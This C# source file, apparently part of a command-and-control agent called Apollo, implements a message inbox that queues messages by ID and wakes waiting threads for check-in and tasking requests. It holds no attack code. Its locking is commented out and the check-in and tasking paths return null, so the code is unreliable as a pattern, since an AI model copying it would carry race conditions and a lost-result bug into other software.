using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using static Utils.DebugUtils;

namespace Apollo.MessageInbox
{
    public class Inbox
    {
        private static Mutex mtx = new Mutex();
        private static Dictionary<string, object> TaskMessages = new Dictionary<string, object>();
        private static Dictionary<string, AutoResetEvent> WaitingRecv = new Dictionary<string, AutoResetEvent>();

        private static readonly AutoResetEvent areCheckinEvent = new AutoResetEvent(false);
        private static readonly AutoResetEvent areGetTaskingEvent = new AutoResetEvent(false);


        private static List<object> ServerMessages = new List<object>();
#if DEBUG
        private static Dictionary<string, Dictionary<string, object>> threadTracker = new Dictionary<string, Dictionary<string, object>>();
#endif
        public static void AddMessage(string id, object msg)
        {
#if DEBUG
            string trackerID = "AddMessage-" + id;
            threadTracker[trackerID] = new Dictionary<string, object>()
            {
                { "state", "waiting" },
                { "stack_trace", Environment.StackTrace },
            };
#endif
            //mtx.WaitOne();
#if DEBUG
            threadTracker[trackerID]["state"] = "adding";
#endif
            DebugWriteLine($"New MSG for {id}");
            try
            {
                TaskMessages[id] = msg;
                if (id.StartsWith("checkin"))
                    areCheckinEvent.Set();
                else if (id.StartsWith("get_tasking"))
                    areGetTaskingEvent.Set();
                else if (WaitingRecv.ContainsKey(id))
                    WaitingRecv[id].Set();
                //if (TaskMessages.ContainsKey(id))
                //    TaskMessages[id] = msg;
                //else
                //    TaskMessages.Add(id, msg);
#if DEBUG
                threadTracker[trackerID]["state"] = "releasing";
#endif
            } catch (Exception ex)
            {
#if DEBUG
                Console.WriteLine("[-] Exception in AddMessage while adding key {0}: {1}\n{2}", id, ex.Message, ex.StackTrace);
#endif
            } finally
            {
                //mtx.ReleaseMutex();
            }
#if DEBUG
            threadTracker[trackerID]["state"] = "released";
#endif

        }


        private static string TaskMessageHasKeyWithPrefix(string prefix)
        {
            string result = "";
            foreach(string key in TaskMessages.Keys.ToArray())
            {
                if (key.StartsWith(prefix))
                {
                    result = key;
                    break;
                }
            }    

            return result;
        }

        public static object GetMessage(string id)
        {
            DebugWriteLine($"Getting MSG {id}...");
            object result = null;
            if (id.StartsWith("checkin"))
            {
                areCheckinEvent.WaitOne();
                id = TaskMessageHasKeyWithPrefix(id);
                if (id == "")
                {
                    throw new Exception("Unexpected code path.");
                }
            } else if (id.StartsWith("get_tasking"))
            {
                areGetTaskingEvent.WaitOne();
                id = TaskMessageHasKeyWithPrefix(id);
                if (id == "")
                {
                    throw new Exception("Unexpected code path.");
                }
            } else
            {
                if (TaskMessages.ContainsKey(id))
                {
                    result = TaskMessages[id];
                    TaskMessages.Remove(id);
                } else
                {
                    WaitingRecv[id] = new AutoResetEvent(false);
                    WaitingRecv[id].WaitOne();
                    WaitingRecv.Remove(id);
                    result = TaskMessages[id];
                    TaskMessages.Remove(id);
                }
            }
#if DEBUG
            string trackerID = "GetMessage-" + id;
            threadTracker[trackerID] = new Dictionary<string, object>()
            {
                { "state", "waiting" },
                { "stack_trace", Environment.StackTrace },
            };
#endif
            //mtx.WaitOne();
#if DEBUG
            threadTracker[trackerID]["state"] = "setting";
#endif
//            try
//            {
//                result = TaskMessages[id];
//                TaskMessages.Remove(id);
//            } catch (Exception ex)
//            {
//#if DEBUG
//                Console.WriteLine("[-] Error in GetMessage for ID {0}: {1}\n{2}", id, ex.Message, ex.StackTrace);
//#endif
//            } finally
//            {
//#if DEBUG
//                threadTracker[trackerID]["state"] = "releasing";
//#endif
//                //mtx.ReleaseMutex();
//            }
#if DEBUG
            threadTracker[trackerID]["state"] = "released";
#endif
            DebugWriteLine($"Popped MSG {id}...");
            return result;
        }
    }
}
